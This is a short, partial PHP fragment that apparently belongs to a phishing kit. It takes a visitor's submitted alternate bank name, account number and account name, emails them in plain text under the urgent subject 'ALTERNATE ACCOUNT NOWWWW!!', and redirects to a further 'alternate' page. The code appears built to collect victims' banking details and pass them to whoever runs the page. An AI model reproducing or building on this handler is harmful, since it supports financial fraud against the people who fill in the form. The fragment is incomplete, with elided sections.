...
$altbname = $_POST["altbname"];
$altacct = $_POST["altacct"];
...
try{ 
    ...
    $phpmailer->Subject = "ALTERNATE ACCOUNT NOWWWW!!";
    $phpmailer->Body= "alternate bank name: $altbname.  alternate account number: $altacct. alternate account name: $altname";



   $phpmailer->send(); 

   header("Location: ../alternate/index.html");
